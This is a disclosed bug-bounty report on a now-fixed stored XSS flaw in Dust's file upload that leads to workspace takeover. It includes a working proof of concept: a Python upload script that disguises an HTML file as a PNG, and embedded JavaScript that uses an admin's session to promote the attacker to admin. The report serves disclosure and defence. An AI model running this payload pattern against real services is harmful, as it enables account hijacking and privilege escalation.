---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss-stored
  - vuln/xss
  - vuln/broken-access-control
  - vuln/privilege-escalation
  - vuln/cors-misconfig
  - impact/credential-theft
  - trigger/admin-required
  - trigger/victim-interaction
  - trigger/session-cookie
  - trigger/file-upload
  - trigger/cors-origin
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2025-05-02
submitted: 2025-04-28T11:26:38.120Z
bounty_usd: null
votes: 118
cve: []
program: "[[programs/dust|Dust]]"
reporter: "sjalu"
source: "https://hackerone.com/reports/3115705"
title: "Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover"
---
# Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 118 | **Program:** Dust | **Disclosed:** 2025-05-02

- Report: [https://hackerone.com/reports/3115705](https://hackerone.com/reports/3115705)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2025-04-28T11:26:38.120Z

## Report summary

A stored Cross-Site Scripting (XSS) vulnerability exists in Dust’s file upload functionality, allowing an attacker to execute arbitrary JavaScript in the context of other workspace members’ browsers. By uploading a malicious HTML file and convincing another user to interact with it, an attacker can fully impersonate that user and perform any actions available to them without stealing their cookies. If the victim holds administrative privileges, the attacker can escalate their own permissions, revoke others’ access, read sensitive data, and take full control over the workspace. The impact is critical and can lead to full account and organizational takeover.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.

An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

This allows an attacker to issue authenticated API requests on behalf of the victim, including:
	•	Promoting their own account to Admin
	•	Downgrading or removing legitimate admins
	•	Accessing and deleting secrets
	•	Full control over the workspace

The attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once triggered, the attacker can fully compromise the workspace.

## Steps To Reproduce:

  1. Set up a workspace where you are admin.
 2. Invite a dummy account with the normal member role.
  3. Upload the malicious file on the dummy account using the Python script below. Use the HTML found at the bottom for upload.
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

cookies = {
    'appSession': '<dummy_account_session>',
}

json_data = {
    'contentType': 'text/html',
    'fileName': 'xss_poc.png',
    'fileSize': 7331,
    'useCase': 'conversation'
}

response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.text)

uploadUrl = response.json()['file']['uploadUrl']

cookies = {
    'appSession': '<dummy_account_session>',
}

m = MultipartEncoder(
    fields={
        'file': (
            'xss_poc.png',  # Filename
            open('Dust/xss.html', 'rb'),  # File object
            'text/html'  # Content-Type
        )
    }
)

headers = {
    'accept': '*/*',
    'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': m.content_type,  # This will correctly set boundary
    'origin': 'https://dust.tt',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

# Make the request
response = requests.post(
    url=uploadUrl,
    headers=headers,
    cookies=cookies,
    data=m  
)

print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
```
  4. Share the URL with the workspace admin account.
 5. When the victim visits the link, your script runs automatically, promoting the dummy account to Admin. 

HTML File:
```html
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>
    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>
  </div>

<script>
// Your user ID here (dummy account's ID)
const attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!

fetch('https://dust.tt/api/user', {
    method: 'GET',
    headers: {
        'accept': '*/*',
        'x-commit-hash': '41c0391',
    },
    credentials: 'include'
})
.then(res => res.json())
.then(userData => {
    if (userData.user && userData.user.workspaces && userData.user.workspaces.length > 0) {
        const workspaceId = userData.user.workspaces[0].sId; // Get workspace ID
        const victimUserId = userData.user.id; // Victim's own ID

        // 1. Promote attacker to admin
        fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'accept': '*/*',
                'x-commit-hash': '41c0391',
            },
            credentials: 'include',
            body: JSON.stringify({
                role: "admin"
            })
        });

        alert(`PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}`);
    }
});
</script>
</body>
</html>
```

## Impact

This vulnerability allows an attacker to execute arbitrary JavaScript in the browser of any user within the same workspace who visits a malicious link. Through this, the attacker can perform any actions on behalf of the victim user, leveraging their active session without needing to steal or view the session cookie itself. An attacker view  (only key, not value - value is hidden for everyone) and delete private secrets, access internal data, modify settings, and if the victim has administrative privileges, escalate their own account to an admin role and revoke admin rights from others. This results in a full compromise of the user account, potential privilege escalation, and takeover of the entire workspace. The overall security impact is critical.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2025-04-29** @sjalu: Hey, thank you for the quick triage and for taking this seriously.

There are definitely some interesting attack paths enabled by this issue. I highlighted what I believe is the most critical one: privilege escalation by downgrading an admin and elevating a regular member to admin, ultimately resulting in full workspace takeover. Another possible vector for full account compromise, depending on implementation, would be if there are internal requests that refresh or rotate session tokens. If such a request exists, it could potentially be triggered within the victim’s session context and the response (e.g., new token) exfiltrated to an attacker-controlled server.

Regarding what was mentioned in the GitHub issue:

>“Marking as p1 as pretty critical pending confirmation that this is not exploitable cross-workspace.”

That was also my initial concern when testing the vulnerability. I expected the uploaded HTML file to be publicly accessible, which would’ve escalated the impact significantly. While the current PoC appears to require the victim to be in the same workspace, I wouldn’t rule out the possibility that similar attack surfaces exist elsewhere in the platform, particularly if the same HTML upload vector is allowed in other places (e.g., public-facing content, shared assets). In that case, the attack surface would widen to include cross-workspace and even unauthenticated attack scenarios.

As you likely know, stored XSS bugs like this tend to open the door to a wide range of abuse, but in the end, the fix is almost always straightforward. I noticed MIME-type restrictions are already in place (e.g., rejecting `image/svg+xml`), so I was a bit surprised that `text/html` was still accepted.

Happy to help further if needed, thanks again for the attention on this!
- **2025-04-29** @spolu-dust: We are aligned. Current belief is that this is only intra-workspace and we will definitely audit similar endpoints for potential cross-workspace availability but very unlikely :+1:
- **2025-04-29** @sjalu: Sounds good!
- **2025-04-29** @spolu-dust: We have a strong belief that this is only an intra-workspace exploit. We are mitigating by downloading all contents except a whitelist of mimeTypes  which will likely be images only.
- **2025-04-29** @sjalu: I gotcha. Wouldn't it be easier to just disallow `text/html` instead? The endpoint doesn't expect anything other than an image anyways as far as I know.
- **Report Resolved**
- **2025-04-29** @sjalu: Hey. Did a quick retest now. I'm able to upload the same as before, but it's no longer accessible in browser, just automatically downloaded.
- **Agreed On Going Public**
- **2025-05-02** @sjalu: Bumping this for disclosure, thanks.
- **Agreed On Going Public**
- **Report Became Public**
